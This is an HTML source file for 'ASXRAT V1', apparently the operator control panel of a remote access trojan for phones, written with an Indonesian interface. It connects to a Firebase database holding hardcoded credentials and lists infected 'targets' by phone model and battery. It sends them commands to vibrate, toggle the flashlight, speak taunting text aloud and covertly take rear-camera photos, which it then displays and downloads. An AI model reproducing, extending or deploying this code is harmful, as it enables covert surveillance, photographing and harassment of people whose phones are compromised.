<!DOCTYPE html>
<html>
<head>
    <title>ASXRAT V1 MASTER</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: monospace; padding: 20px; }
        .card { border: 2px solid #00f2ff; padding: 15px; margin-bottom: 20px; background: #0a0000; border-radius: 10px; box-shadow: 0 0 10px #00f2ff; }
        .btn { width: 48%; padding: 12px; margin: 5px 1%; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; text-transform: uppercase; }
        .btn-full { width: 100%; margin: 5px 0; }
        .btn-on { background: #ff4444; color: #fff; }
        .btn-off { background: #333; color: #fff; }
        .btn-voice { background: #00f2ff; color: #000; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #00f2ff; box-sizing: border-box; }
        img { width: 100%; max-width: 350px; border: 1px solid #00f2ff; margin-top: 10px; }
        h1 { text-align: center; text-shadow: 0 0 10px #00f2ff; }
    </style>
</head>
<body>

    <h1>ASXRAT V1 | CONTROL CENTER</h1>
    <div id="targetList">Scanning Target...</div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
            authDomain: "control-rat.firebaseapp.com",
            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "control-rat",
            storageBucket: "control-rat.appspot.com",
            messagingSenderId: "181283651682",
            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        db.ref('targets').on('value', (s) => {
            const list = document.getElementById('targetList');
            list.innerHTML = "";
            s.forEach(child => {
                const id = child.key;
                const data = child.val();
                list.innerHTML += `
                <div class="card">
                    <h3 style="color:#ff0000; margin:0;">📱 ${data.model}</h3>
                    <p>🔋 Batt: ${data.battery || '??'} (${data.charging || '-'}) | ID: ${id}</p>
                    
                    <button class="btn btn-on" onclick="sendCmd('${id}','vbt_on','')">📳 GETAR ON</button>
                    <button class="btn btn-off" onclick="sendCmd('${id}','vbt_off','')">📳 GETAR OFF</button>
                    
                    <button class="btn" style="background:#ffcc00" onclick="sendCmd('${id}','flash','on')">🔦 SENTER ON</button>
                    <button class="btn btn-off" onclick="sendCmd('${id}','flash','off')">OFF</button>
                    
                    <input type="text" id="voice_${id}" placeholder="Ketik suara untuk target...">
                    <button class="btn btn-full btn-voice" onclick="sendVoice('${id}')">📢 KIRIM SUARA</button>
                    
                    <button class="btn btn-full" style="background:#fff" onclick="sendCmd('${id}','snap','')">📸 AMBIL FOTO BELAKANG</button>
                    
                    <div id="res_${id}">
                        ${data.foto ? `<img src="${data.foto}"><br><a href="${data.foto}" download="ASX_${id}.jpg"><button class="btn btn-full" style="background:green;color:#fff">📥 SIMPAN FOTO</button></a>` : ''}
                    </div>
                </div>`;
            });
        });

        function sendVoice(id) {
            const txt = document.getElementById('voice_'+id).value;
            db.ref('commands/' + id).set({ type: "speak", text: txt || "Lu dongo" });
        }

        function sendCmd(id, type, stat) {
            db.ref('commands/' + id).set({ type: type, status: stat });
        }
    </script>
</body>
</html>
